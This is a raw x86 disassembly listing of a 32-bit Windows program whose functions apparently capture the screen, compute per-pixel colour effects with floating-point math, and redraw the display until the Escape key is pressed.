  4016e6:	ff 15 20 60 40 00    	call   *0x406020
  4016ec:	56                   	push   %esi
  4016ed:	6a 00                	push   $0x0
  4016ef:	ff 15 b0 60 40 00    	call   *0x4060b0
  4016f5:	ff 74 24 44          	push   0x44(%esp)
  4016f9:	ff 15 18 60 40 00    	call   *0x406018
  4016ff:	57                   	push   %edi
  401700:	ff 15 10 60 40 00    	call   *0x406010
  401706:	6a 10                	push   $0x10
  401708:	ff 15 64 60 40 00    	call   *0x406064
  40170e:	e9 d3 fd ff ff       	jmp    0x4014e6
  401713:	cc                   	int3
  401714:	cc                   	int3
  401715:	cc                   	int3
  401716:	cc                   	int3
  401717:	cc                   	int3
  401718:	cc                   	int3
  401719:	cc                   	int3
  40171a:	cc                   	int3
  40171b:	cc                   	int3
  40171c:	cc                   	int3
  40171d:	cc                   	int3
  40171e:	cc                   	int3
  40171f:	cc                   	int3
  401720:	55                   	push   %ebp
  401721:	8b ec                	mov    %esp,%ebp
  401723:	83 e4 f8             	and    $0xfffffff8,%esp
  401726:	81 ec 80 00 00 00    	sub    $0x80,%esp
  40172c:	a1 08 80 40 00       	mov    0x408008,%eax
  401731:	33 c4                	xor    %esp,%eax
  401733:	89 44 24 7c          	mov    %eax,0x7c(%esp)
  401737:	56                   	push   %esi
  401738:	57                   	push   %edi
  401739:	6a 00                	push   $0x0
  40173b:	ff 15 b8 60 40 00    	call   *0x4060b8
  401741:	8b 35 c0 60 40 00    	mov    0x4060c0,%esi
  401747:	6a 00                	push   $0x0
  401749:	89 44 24 18          	mov    %eax,0x18(%esp)
  40174d:	ff d6                	call   *%esi
  40174f:	8b f8                	mov    %eax,%edi
  401751:	6a 01                	push   $0x1
  401753:	89 7c 24 24          	mov    %edi,0x24(%esp)
  401757:	ff d6                	call   *%esi
  401759:	6a 00                	push   $0x0
  40175b:	8b f0                	mov    %eax,%esi
  40175d:	c7 44 24 5c 28 00 00 	movl   $0x28,0x5c(%esp)
  401764:	00 
  401765:	6a 00                	push   $0x0
  401767:	8d 44 24 24          	lea    0x24(%esp),%eax
  40176b:	89 74 24 5c          	mov    %esi,0x5c(%esp)
  40176f:	50                   	push   %eax
  401770:	6a 00                	push   $0x0
  401772:	8d 44 24 68          	lea    0x68(%esp),%eax
  401776:	89 7c 24 6c          	mov    %edi,0x6c(%esp)
  40177a:	50                   	push   %eax
  40177b:	ff 74 24 28          	push   0x28(%esp)
  40177f:	0f 57 c0             	xorps  %xmm0,%xmm0
  401782:	89 74 24 78          	mov    %esi,0x78(%esp)
  401786:	c7 44 24 7c 01 00 20 	movl   $0x200001,0x7c(%esp)
  40178d:	00 
  40178e:	c7 84 24 80 00 00 00 	movl   $0x0,0x80(%esp)
  401795:	00 00 00 00 
  401799:	0f 11 84 24 84 00 00 	movups %xmm0,0x84(%esp)
  4017a0:	00 
  4017a1:	66 0f d6 84 24 94 00 	movq   %xmm0,0x94(%esp)
  4017a8:	00 00 
  4017aa:	ff 15 04 60 40 00    	call   *0x406004
  4017b0:	0f 57 c0             	xorps  %xmm0,%xmm0
  4017b3:	66 0f 6e ce          	movd   %esi,%xmm1
  4017b7:	f3 0f 11 44 24 10    	movss  %xmm0,0x10(%esp)
  4017bd:	66 0f 6e c7          	movd   %edi,%xmm0
  4017c1:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
  4017c4:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  4017c8:	0f 5b c9             	cvtdq2ps %xmm1,%xmm1
  4017cb:	f3 0f 5e c1          	divss  %xmm1,%xmm0
  4017cf:	f3 0f 11 44 24 40    	movss  %xmm0,0x40(%esp)
  4017d5:	ff 74 24 14          	push   0x14(%esp)
  4017d9:	ff 15 08 60 40 00    	call   *0x406008
  4017df:	ff 74 24 3c          	push   0x3c(%esp)
  4017e3:	89 44 24 28          	mov    %eax,0x28(%esp)
  4017e7:	50                   	push   %eax
  4017e8:	ff 15 00 60 40 00    	call   *0x406000
  4017ee:	68 20 00 cc 00       	push   $0xcc0020
  4017f3:	6a 00                	push   $0x0
  4017f5:	6a 00                	push   $0x0
  4017f7:	ff 74 24 20          	push   0x20(%esp)
  4017fb:	56                   	push   %esi
  4017fc:	57                   	push   %edi
  4017fd:	6a 00                	push   $0x0
  4017ff:	6a 00                	push   $0x0
  401801:	ff 74 24 44          	push   0x44(%esp)
  401805:	ff 15 20 60 40 00    	call   *0x406020
  40180b:	f3 0f 10 4c 24 10    	movss  0x10(%esp),%xmm1
  401811:	33 c9                	xor    %ecx,%ecx
  401813:	89 4c 24 34          	mov    %ecx,0x34(%esp)
  401817:	f3 0f 58 0d 88 63 40 	addss  0x406388,%xmm1
  40181e:	00 
  40181f:	f3 0f 11 4c 24 10    	movss  %xmm1,0x10(%esp)
  401825:	85 f6                	test   %esi,%esi
  401827:	0f 8e b9 02 00 00    	jle    0x401ae6
  40182d:	8b 44 24 20          	mov    0x20(%esp),%eax
  401831:	33 d2                	xor    %edx,%edx
  401833:	89 54 24 38          	mov    %edx,0x38(%esp)
  401837:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  40183e:	00 00 
  401840:	33 ff                	xor    %edi,%edi
  401842:	85 c0                	test   %eax,%eax
  401844:	0f 8e 7e 02 00 00    	jle    0x401ac8
  40184a:	66 0f 6e d6          	movd   %esi,%xmm2
  40184e:	8b f2                	mov    %edx,%esi
  401850:	66 0f 6e c1          	movd   %ecx,%xmm0
  401854:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
  401857:	0f 5b d2             	cvtdq2ps %xmm2,%xmm2
  40185a:	f3 0f 10 1d c4 63 40 	movss  0x4063c4,%xmm3
  401861:	00 
  401862:	f3 0f 5e c2          	divss  %xmm2,%xmm0
  401866:	f3 0f 58 c0          	addss  %xmm0,%xmm0
  40186a:	f3 0f 5c c3          	subss  %xmm3,%xmm0
  40186e:	0f 28 d0             	movaps %xmm0,%xmm2
  401871:	f3 0f 11 44 24 30    	movss  %xmm0,0x30(%esp)
  401877:	f3 0f 59 d0          	mulss  %xmm0,%xmm2
  40187b:	0f 28 c1             	movaps %xmm1,%xmm0
  40187e:	f3 0f 59 05 2c 64 40 	mulss  0x40642c,%xmm0
  401885:	00 
  401886:	f3 0f 11 54 24 50    	movss  %xmm2,0x50(%esp)
  40188c:	f3 0f 11 44 24 44    	movss  %xmm0,0x44(%esp)
  401892:	0f 28 c1             	movaps %xmm1,%xmm0
  401895:	f3 0f 58 c1          	addss  %xmm1,%xmm0
  401899:	f3 0f 11 44 24 48    	movss  %xmm0,0x48(%esp)
  40189f:	90                   	nop
  4018a0:	66 0f 6e cf          	movd   %edi,%xmm1
  4018a4:	0f 5b c9             	cvtdq2ps %xmm1,%xmm1
  4018a7:	66 0f 6e c0          	movd   %eax,%xmm0
  4018ab:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
  4018ae:	f3 0f 5e c8          	divss  %xmm0,%xmm1
  4018b2:	f3 0f 58 c9          	addss  %xmm1,%xmm1
  4018b6:	f3 0f 5c cb          	subss  %xmm3,%xmm1
  4018ba:	f3 0f 59 4c 24 40    	mulss  0x40(%esp),%xmm1
  4018c0:	0f 28 c1             	movaps %xmm1,%xmm0
  4018c3:	f3 0f 11 4c 24 18    	movss  %xmm1,0x18(%esp)
  4018c9:	f3 0f 59 c1          	mulss  %xmm1,%xmm0
  4018cd:	f3 0f 58 c2          	addss  %xmm2,%xmm0
  4018d1:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  4018d4:	e8 69 44 00 00       	call   0x405d42
  4018d9:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  4018dd:	f3 0f 59 05 4c 64 40 	mulss  0x40644c,%xmm0
  4018e4:	00 
  4018e5:	f3 0f 5c 44 24 44    	subss  0x44(%esp),%xmm0
  4018eb:	f3 0f 5a c0          	cvtss2sd %xmm0,%xmm0
  4018ef:	e8 48 44 00 00       	call   0x405d3c
  4018f4:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  4018f8:	f3 0f 11 44 24 0c    	movss  %xmm0,0xc(%esp)
  4018fe:	f3 0f 10 44 24 30    	movss  0x30(%esp),%xmm0
  401904:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  401907:	f2 0f 11 44 24 28    	movsd  %xmm0,0x28(%esp)
  40190d:	f3 0f 10 44 24 18    	movss  0x18(%esp),%xmm0
  401913:	dd 44 24 28          	fldl   0x28(%esp)
  401917:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  40191a:	f2 0f 11 44 24 28    	movsd  %xmm0,0x28(%esp)
  401920:	dd 44 24 28          	fldl   0x28(%esp)
  401924:	e8 f5 43 00 00       	call   0x405d1e
  401929:	dd 5c 24 28          	fstpl  0x28(%esp)
  40192d:	f2 0f 10 44 24 28    	movsd  0x28(%esp),%xmm0
  401933:	66 0f 5a c0          	cvtpd2ps %xmm0,%xmm0
  401937:	f3 0f 59 05 44 64 40 	mulss  0x406444,%xmm0
  40193e:	00 
  40193f:	f3 0f 58 44 24 48    	addss  0x48(%esp),%xmm0
  401945:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  401948:	e8 ef 43 00 00       	call   0x405d3c
  40194d:	f3 0f 10 4c 24 0c    	movss  0xc(%esp),%xmm1
  401953:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  401957:	f3 0f 58 c8          	addss  %xmm0,%xmm1
  40195b:	f3 0f 10 44 24 30    	movss  0x30(%esp),%xmm0
  401961:	f3 0f 58 44 24 18    	addss  0x18(%esp),%xmm0
  401967:	f3 0f 11 4c 24 0c    	movss  %xmm1,0xc(%esp)
  40196d:	f3 0f 59 05 38 64 40 	mulss  0x406438,%xmm0
  401974:	00 
  401975:	f3 0f 58 44 24 10    	addss  0x10(%esp),%xmm0
  40197b:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  40197e:	e8 b9 43 00 00       	call   0x405d3c
  401983:	f3 0f 10 4c 24 0c    	movss  0xc(%esp),%xmm1
  401989:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  40198d:	f3 0f 58 c8          	addss  %xmm0,%xmm1
  401991:	0f 28 c1             	movaps %xmm1,%xmm0
  401994:	f3 0f 11 4c 24 0c    	movss  %xmm1,0xc(%esp)
  40199a:	f3 0f 59 05 30 64 40 	mulss  0x406430,%xmm0
  4019a1:	00 
  4019a2:	f3 0f 58 44 24 10    	addss  0x10(%esp),%xmm0
  4019a8:	f3 0f 11 44 24 18    	movss  %xmm0,0x18(%esp)
  4019ae:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  4019b1:	e8 86 43 00 00       	call   0x405d3c
  4019b6:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  4019ba:	f3 0f 59 05 b0 63 40 	mulss  0x4063b0,%xmm0
  4019c1:	00 
  4019c2:	f3 0f 58 05 b0 63 40 	addss  0x4063b0,%xmm0
  4019c9:	00 
  4019ca:	f3 0f 11 44 24 4c    	movss  %xmm0,0x4c(%esp)
  4019d0:	f3 0f 10 44 24 18    	movss  0x18(%esp),%xmm0
  4019d6:	f3 0f 58 05 18 64 40 	addss  0x406418,%xmm0
  4019dd:	00 
  4019de:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  4019e1:	e8 56 43 00 00       	call   0x405d3c
  4019e6:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  4019ea:	f3 0f 59 05 b0 63 40 	mulss  0x4063b0,%xmm0
  4019f1:	00 
  4019f2:	f3 0f 58 05 b0 63 40 	addss  0x4063b0,%xmm0
  4019f9:	00 
  4019fa:	f3 0f 11 44 24 28    	movss  %xmm0,0x28(%esp)
  401a00:	f3 0f 10 44 24 18    	movss  0x18(%esp),%xmm0
  401a06:	f3 0f 58 05 34 64 40 	addss  0x406434,%xmm0
  401a0d:	00 
  401a0e:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  401a11:	e8 26 43 00 00       	call   0x405d3c
  401a16:	f3 0f 10 4c 24 0c    	movss  0xc(%esp),%xmm1
  401a1c:	0f 57 d2             	xorps  %xmm2,%xmm2
  401a1f:	f2 0f 5a d0          	cvtsd2ss %xmm0,%xmm2
  401a23:	0f 5a c1             	cvtps2pd %xmm1,%xmm0
  401a26:	f3 0f 59 15 b0 63 40 	mulss  0x4063b0,%xmm2
  401a2d:	00 
  401a2e:	0f 54 05 80 64 40 00 	andps  0x406480,%xmm0
  401a35:	66 0f 5a c0          	cvtpd2ps %xmm0,%xmm0
  401a39:	f3 0f 58 15 b0 63 40 	addss  0x4063b0,%xmm2
  401a40:	00 
  401a41:	0f 2f 05 dc 63 40 00 	comiss 0x4063dc,%xmm0
  401a48:	f3 0f 10 1d c4 63 40 	movss  0x4063c4,%xmm3
  401a4f:	00 
  401a50:	76 0b                	jbe    0x401a5d
  401a52:	0f 28 c3             	movaps %xmm3,%xmm0
  401a55:	0f 28 cb             	movaps %xmm3,%xmm1
  401a58:	0f 28 d3             	movaps %xmm3,%xmm2
  401a5b:	eb 0c                	jmp    0x401a69
  401a5d:	f3 0f 10 44 24 4c    	movss  0x4c(%esp),%xmm0
  401a63:	f3 0f 10 4c 24 28    	movss  0x28(%esp),%xmm1
  401a69:	f3 0f 10 25 60 64 40 	movss  0x406460,%xmm4
  401a70:	00 
  401a71:	47                   	inc    %edi
  401a72:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  401a76:	f3 0f 59 c4          	mulss  %xmm4,%xmm0
  401a7a:	f3 0f 59 cc          	mulss  %xmm4,%xmm1
  401a7e:	f3 0f 2c c8          	cvttss2si %xmm0,%ecx
  401a82:	f3 0f 59 d4          	mulss  %xmm4,%xmm2
  401a86:	88 4c 06 02          	mov    %cl,0x2(%esi,%eax,1)
  401a8a:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  401a8e:	f3 0f 2c c9          	cvttss2si %xmm1,%ecx
  401a92:	88 4c 06 01          	mov    %cl,0x1(%esi,%eax,1)
  401a96:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  401a9a:	f3 0f 2c ca          	cvttss2si %xmm2,%ecx
  401a9e:	f3 0f 10 54 24 50    	movss  0x50(%esp),%xmm2
  401aa4:	88 0c 06             	mov    %cl,(%esi,%eax,1)
  401aa7:	83 c6 04             	add    $0x4,%esi
  401aaa:	8b 44 24 20          	mov    0x20(%esp),%eax
  401aae:	3b f8                	cmp    %eax,%edi
  401ab0:	0f 8c ea fd ff ff    	jl     0x4018a0
  401ab6:	f3 0f 10 4c 24 10    	movss  0x10(%esp),%xmm1
  401abc:	8b 4c 24 34          	mov    0x34(%esp),%ecx
  401ac0:	8b 54 24 38          	mov    0x38(%esp),%edx
  401ac4:	8b 74 24 54          	mov    0x54(%esp),%esi
  401ac8:	41                   	inc    %ecx
  401ac9:	8d 3c 85 00 00 00 00 	lea    0x0(,%eax,4),%edi
  401ad0:	03 d7                	add    %edi,%edx
  401ad2:	89 4c 24 34          	mov    %ecx,0x34(%esp)
  401ad6:	89 54 24 38          	mov    %edx,0x38(%esp)
  401ada:	3b ce                	cmp    %esi,%ecx
  401adc:	0f 8c 5e fd ff ff    	jl     0x401840
  401ae2:	8b 7c 24 20          	mov    0x20(%esp),%edi
  401ae6:	0f 28 c1             	movaps %xmm1,%xmm0
  401ae9:	f3 0f 59 05 38 64 40 	mulss  0x406438,%xmm0
  401af0:	00 
  401af1:	f3 0f 5a c0          	cvtss2sd %xmm0,%xmm0
  401af5:	e8 42 42 00 00       	call   0x405d3c
  401afa:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  401afe:	68 20 00 cc 00       	push   $0xcc0020
  401b03:	6a 00                	push   $0x0
  401b05:	6a 00                	push   $0x0
  401b07:	ff 74 24 30          	push   0x30(%esp)
  401b0b:	f3 0f 59 05 2c 64 40 	mulss  0x40642c,%xmm0
  401b12:	00 
  401b13:	56                   	push   %esi
  401b14:	57                   	push   %edi
  401b15:	f3 0f 2c c0          	cvttss2si %xmm0,%eax
  401b19:	50                   	push   %eax
  401b1a:	50                   	push   %eax
  401b1b:	ff 74 24 34          	push   0x34(%esp)
  401b1f:	ff 15 20 60 40 00    	call   *0x406020
  401b25:	ff 74 24 24          	push   0x24(%esp)
  401b29:	ff 15 10 60 40 00    	call   *0x406010
  401b2f:	6a 10                	push   $0x10
  401b31:	ff 15 64 60 40 00    	call   *0x406064
  401b37:	6a 1b                	push   $0x1b
  401b39:	ff 15 c8 60 40 00    	call   *0x4060c8
  401b3f:	66 85 c0             	test   %ax,%ax
  401b42:	0f 84 8d fc ff ff    	je     0x4017d5
  401b48:	ff 74 24 3c          	push   0x3c(%esp)
  401b4c:	ff 15 18 60 40 00    	call   *0x406018
  401b52:	ff 74 24 14          	push   0x14(%esp)
  401b56:	6a 00                	push   $0x0
  401b58:	ff 15 b0 60 40 00    	call   *0x4060b0
  401b5e:	8b 8c 24 84 00 00 00 	mov    0x84(%esp),%ecx
  401b65:	33 c0                	xor    %eax,%eax
  401b67:	5f                   	pop    %edi
  401b68:	5e                   	pop    %esi
  401b69:	33 cc                	xor    %esp,%ecx
  401b6b:	e8 54 33 00 00       	call   0x404ec4
  401b70:	8b e5                	mov    %ebp,%esp
  401b72:	5d                   	pop    %ebp
  401b73:	c2 04 00             	ret    $0x4
  401b76:	cc                   	int3
  401b77:	cc                   	int3
  401b78:	cc                   	int3
  401b79:	cc                   	int3
  401b7a:	cc                   	int3
  401b7b:	cc                   	int3
  401b7c:	cc                   	int3
  401b7d:	cc                   	int3
  401b7e:	cc                   	int3
  401b7f:	cc                   	int3
  401b80:	cc                   	int3
  401b81:	cc                   	int3
  401b82:	cc                   	int3
  401b83:	cc                   	int3
  401b84:	cc                   	int3
  401b85:	cc                   	int3
  401b86:	cc                   	int3
  401b87:	cc                   	int3
  401b88:	cc                   	int3
  401b89:	cc                   	int3
  401b8a:	cc                   	int3
  401b8b:	cc                   	int3
  401b8c:	cc                   	int3
  401b8d:	cc                   	int3
  401b8e:	cc                   	int3
  401b8f:	cc                   	int3
  401b90:	55                   	push   %ebp
  401b91:	8b ec                	mov    %esp,%ebp
  401b93:	83 e4 f8             	and    $0xfffffff8,%esp
  401b96:	81 ec 88 00 00 00    	sub    $0x88,%esp
  401b9c:	a1 08 80 40 00       	mov    0x408008,%eax
  401ba1:	33 c4                	xor    %esp,%eax
  401ba3:	89 84 24 84 00 00 00 	mov    %eax,0x84(%esp)
  401baa:	56                   	push   %esi
  401bab:	57                   	push   %edi
  401bac:	6a 00                	push   $0x0
  401bae:	ff 15 b8 60 40 00    	call   *0x4060b8
  401bb4:	8b 35 c0 60 40 00    	mov    0x4060c0,%esi
  401bba:	6a 00                	push   $0x0
  401bbc:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  401bc0:	ff d6                	call   *%esi
  401bc2:	8b f8                	mov    %eax,%edi
  401bc4:	6a 01                	push   $0x1
  401bc6:	89 7c 24 28          	mov    %edi,0x28(%esp)
  401bca:	ff d6                	call   *%esi
  401bcc:	8b 74 24 18          	mov    0x18(%esp),%esi
  401bd0:	0f 57 c0             	xorps  %xmm0,%xmm0
  401bd3:	6a 00                	push   $0x0
  401bd5:	6a 00                	push   $0x0
  401bd7:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  401bdb:	89 44 24 70          	mov    %eax,0x70(%esp)
  401bdf:	8d 44 24 14          	lea    0x14(%esp),%eax
  401be3:	50                   	push   %eax
  401be4:	6a 00                	push   $0x0
  401be6:	8d 44 24 70          	lea    0x70(%esp),%eax
  401bea:	c7 44 24 70 28 00 00 	movl   $0x28,0x70(%esp)
  401bf1:	00 
  401bf2:	50                   	push   %eax
  401bf3:	56                   	push   %esi
  401bf4:	89 7c 24 7c          	mov    %edi,0x7c(%esp)
  401bf8:	c7 84 24 84 00 00 00 	movl   $0x200001,0x84(%esp)
  401bff:	01 00 20 00 
  401c03:	c7 84 24 88 00 00 00 	movl   $0x0,0x88(%esp)
  401c0a:	00 00 00 00 
  401c0e:	0f 11 84 24 8c 00 00 	movups %xmm0,0x8c(%esp)
  401c15:	00 
  401c16:	66 0f d6 84 24 9c 00 	movq   %xmm0,0x9c(%esp)
  401c1d:	00 00 
  401c1f:	ff 15 04 60 40 00    	call   *0x406004
  401c25:	0f 57 c9             	xorps  %xmm1,%xmm1
  401c28:	89 44 24 40          	mov    %eax,0x40(%esp)
  401c2c:	6a 1b                	push   $0x1b
  401c2e:	f3 0f 11 4c 24 14    	movss  %xmm1,0x14(%esp)
  401c34:	c7 44 24 2c 00 00 00 	movl   $0x0,0x2c(%esp)
  401c3b:	00 
  401c3c:	c6 44 24 0f 00       	movb   $0x0,0xf(%esp)
  401c41:	ff 15 c8 60 40 00    	call   *0x4060c8
  401c47:	66 85 c0             	test   %ax,%ax
  401c4a:	0f 85 b8 03 00 00    	jne    0x402008
  401c50:	56                   	push   %esi
  401c51:	ff 15 08 60 40 00    	call   *0x406008
  401c57:	ff 74 24 40          	push   0x40(%esp)
  401c5b:	89 44 24 60          	mov    %eax,0x60(%esp)
  401c5f:	50                   	push   %eax
  401c60:	ff 15 00 60 40 00    	call   *0x406000
  401c66:	f3 0f 10 44 24 10    	movss  0x10(%esp),%xmm0
  401c6c:	f3 0f 58 05 90 63 40 	addss  0x406390,%xmm0
  401c73:	00 
  401c74:	f3 0f 11 44 24 10    	movss  %xmm0,0x10(%esp)
  401c7a:	ff 15 50 60 40 00    	call   *0x406050
  401c80:	8b c8                	mov    %eax,%ecx
  401c82:	89 44 24 34          	mov    %eax,0x34(%esp)
  401c86:	2b 4c 24 28          	sub    0x28(%esp),%ecx
  401c8a:	81 f9 b8 0b 00 00    	cmp    $0xbb8,%ecx
  401c90:	76 0e                	jbe    0x401ca0
  401c92:	80 7c 24 0b 00       	cmpb   $0x0,0xb(%esp)
  401c97:	89 44 24 28          	mov    %eax,0x28(%esp)
  401c9b:	0f 94 44 24 0b       	sete   0xb(%esp)
  401ca0:	8b 54 24 14          	mov    0x14(%esp),%edx
  401ca4:	33 f6                	xor    %esi,%esi
  401ca6:	89 74 24 20          	mov    %esi,0x20(%esp)
  401caa:	85 d2                	test   %edx,%edx
  401cac:	0f 8e db 02 00 00    	jle    0x401f8d
  401cb2:	8b 44 24 24          	mov    0x24(%esp),%eax
  401cb6:	33 c9                	xor    %ecx,%ecx
  401cb8:	89 4c 24 3c          	mov    %ecx,0x3c(%esp)
  401cbc:	0f 1f 40 00          	nopl   0x0(%eax)
  401cc0:	33 ff                	xor    %edi,%edi
  401cc2:	85 c0                	test   %eax,%eax
  401cc4:	0f 8e a5 02 00 00    	jle    0x401f6f
  401cca:	66 0f 6e c2          	movd   %edx,%xmm0
  401cce:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
  401cd1:	89 4c 24 38          	mov    %ecx,0x38(%esp)
  401cd5:	66 0f 6e ce          	movd   %esi,%xmm1
  401cd9:	0f 5b c9             	cvtdq2ps %xmm1,%xmm1
  401cdc:	66 0f 6e f0          	movd   %eax,%xmm6
  401ce0:	f3 0f 5e c8          	divss  %xmm0,%xmm1
  401ce4:	0f 5b f6             	cvtdq2ps %xmm6,%xmm6
  401ce7:	f3 0f 10 54 24 10    	movss  0x10(%esp),%xmm2
  401ced:	f3 0f 58 c9          	addss  %xmm1,%xmm1
  401cf1:	f3 0f 10 25 c4 63 40 	movss  0x4063c4,%xmm4
  401cf8:	00 
  401cf9:	0f 28 de             	movaps %xmm6,%xmm3
  401cfc:	f3 0f 5e d8          	divss  %xmm0,%xmm3
  401d00:	f3 0f 10 2d b0 63 40 	movss  0x4063b0,%xmm5
  401d07:	00 
  401d08:	0f 28 c2             	movaps %xmm2,%xmm0
  401d0b:	f3 0f 59 05 b8 63 40 	mulss  0x4063b8,%xmm0
  401d12:	00 
  401d13:	f3 0f 5c cc          	subss  %xmm4,%xmm1
  401d17:	f3 0f 11 74 24 58    	movss  %xmm6,0x58(%esp)
  401d1d:	f3 0f 11 5c 24 54    	movss  %xmm3,0x54(%esp)
  401d23:	f3 0f 11 44 24 48    	movss  %xmm0,0x48(%esp)
  401d29:	f3 0f 11 4c 24 44    	movss  %xmm1,0x44(%esp)
  401d2f:	90                   	nop
  401d30:	66 0f 6e cf          	movd   %edi,%xmm1
  401d34:	0f 57 c0             	xorps  %xmm0,%xmm0
  401d37:	0f 5b c9             	cvtdq2ps %xmm1,%xmm1
  401d3a:	be 04 00 00 00       	mov    $0x4,%esi
  401d3f:	f3 0f 11 44 24 2c    	movss  %xmm0,0x2c(%esp)
  401d45:	0f 28 c4             	movaps %xmm4,%xmm0
  401d48:	f3 0f 5e ce          	divss  %xmm6,%xmm1
  401d4c:	f3 0f 11 64 24 1c    	movss  %xmm4,0x1c(%esp)
  401d52:	f3 0f 58 c9          	addss  %xmm1,%xmm1
  401d56:	f3 0f 11 6c 24 30    	movss  %xmm5,0x30(%esp)
  401d5c:	f3 0f 5c cc          	subss  %xmm4,%xmm1
  401d60:	f3 0f 59 cb          	mulss  %xmm3,%xmm1
  401d64:	f3 0f 11 4c 24 50    	movss  %xmm1,0x50(%esp)
  401d6a:	66 0f 1f 44 00 00    	nopw   0x0(%eax,%eax,1)
  401d70:	f3 0f 59 c1          	mulss  %xmm1,%xmm0
  401d74:	f3 0f 59 05 44 64 40 	mulss  0x406444,%xmm0
  401d7b:	00 
  401d7c:	f3 0f 58 c2          	addss  %xmm2,%xmm0
  401d80:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  401d83:	e8 b4 3f 00 00       	call   0x405d3c
  401d88:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  401d8c:	f3 0f 11 44 24 4c    	movss  %xmm0,0x4c(%esp)
  401d92:	f3 0f 10 44 24 1c    	movss  0x1c(%esp),%xmm0
  401d98:	f3 0f 59 44 24 44    	mulss  0x44(%esp),%xmm0
  401d9e:	f3 0f 59 05 44 64 40 	mulss  0x406444,%xmm0
  401da5:	00 
  401da6:	f3 0f 58 44 24 48    	addss  0x48(%esp),%xmm0
  401dac:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  401daf:	e8 7c 3f 00 00       	call   0x405d30
  401db4:	f3 0f 10 54 24 30    	movss  0x30(%esp),%xmm2
  401dba:	f3 0f 10 2d b0 63 40 	movss  0x4063b0,%xmm5
  401dc1:	00 
  401dc2:	f3 0f 10 4c 24 50    	movss  0x50(%esp),%xmm1
  401dc8:	f2 0f 5a d8          	cvtsd2ss %xmm0,%xmm3
  401dcc:	f3 0f 10 44 24 1c    	movss  0x1c(%esp),%xmm0
  401dd2:	f3 0f 59 5c 24 4c    	mulss  0x4c(%esp),%xmm3
  401dd8:	f3 0f 58 c0          	addss  %xmm0,%xmm0
  401ddc:	f3 0f 59 da          	mulss  %xmm2,%xmm3
  401de0:	f3 0f 59 d5          	mulss  %xmm5,%xmm2
  401de4:	f3 0f 11 44 24 1c    	movss  %xmm0,0x1c(%esp)
  401dea:	f3 0f 58 5c 24 2c    	addss  0x2c(%esp),%xmm3
  401df0:	f3 0f 11 54 24 30    	movss  %xmm2,0x30(%esp)
  401df6:	f3 0f 10 54 24 10    	movss  0x10(%esp),%xmm2
  401dfc:	f3 0f 11 5c 24 2c    	movss  %xmm3,0x2c(%esp)
  401e02:	83 ee 01             	sub    $0x1,%esi
  401e05:	0f 85 65 ff ff ff    	jne    0x401d70
  401e0b:	80 7c 24 0b 00       	cmpb   $0x0,0xb(%esp)
  401e10:	f3 0f 10 25 c4 63 40 	movss  0x4063c4,%xmm4
  401e17:	00 
  401e18:	0f 5a c3             	cvtps2pd %xmm3,%xmm0
  401e1b:	8b 74 24 20          	mov    0x20(%esp),%esi
  401e1f:	f3 0f 10 35 60 64 40 	movss  0x406460,%xmm6
  401e26:	00 
  401e27:	0f 28 d4             	movaps %xmm4,%xmm2
  401e2a:	0f 54 05 80 64 40 00 	andps  0x406480,%xmm0
  401e31:	0f 28 dc             	movaps %xmm4,%xmm3
  401e34:	66 0f 5a c8          	cvtpd2ps %xmm0,%xmm1
  401e38:	0f 28 c1             	movaps %xmm1,%xmm0
  401e3b:	f3 0f 58 c1          	addss  %xmm1,%xmm0
  401e3f:	f3 0f 5d d0          	minss  %xmm0,%xmm2
  401e43:	0f 28 c1             	movaps %xmm1,%xmm0
  401e46:	f3 0f 59 05 d0 63 40 	mulss  0x4063d0,%xmm0
  401e4d:	00 
  401e4e:	f3 0f 5c 05 a4 63 40 	subss  0x4063a4,%xmm0
  401e55:	00 
  401e56:	f3 0f 5d d8          	minss  %xmm0,%xmm3
  401e5a:	0f 28 c5             	movaps %xmm5,%xmm0
  401e5d:	f3 0f 5c c1          	subss  %xmm1,%xmm0
  401e61:	0f 57 c9             	xorps  %xmm1,%xmm1
  401e64:	f3 0f 5f c8          	maxss  %xmm0,%xmm1
  401e68:	0f 84 a0 00 00 00    	je     0x401f0e
  401e6e:	b8 1f 85 eb 51       	mov    $0x51eb851f,%eax
  401e73:	f7 64 24 34          	mull   0x34(%esp)
  401e77:	b8 ff 00 00 00       	mov    $0xff,%eax
  401e7c:	c1 ea 04             	shr    $0x4,%edx
  401e7f:	33 d7                	xor    %edi,%edx
  401e81:	33 d6                	xor    %esi,%edx
  401e83:	0f b6 ca             	movzbl %dl,%ecx
  401e86:	2b c1                	sub    %ecx,%eax
  401e88:	66 0f 6e c1          	movd   %ecx,%xmm0
  401e8c:	b9 32 00 00 00       	mov    $0x32,%ecx
  401e91:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
  401e94:	f3 0f 5e c6          	divss  %xmm6,%xmm0
  401e98:	f3 0f 58 d0          	addss  %xmm0,%xmm2
  401e9c:	66 0f 6e c0          	movd   %eax,%xmm0
  401ea0:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
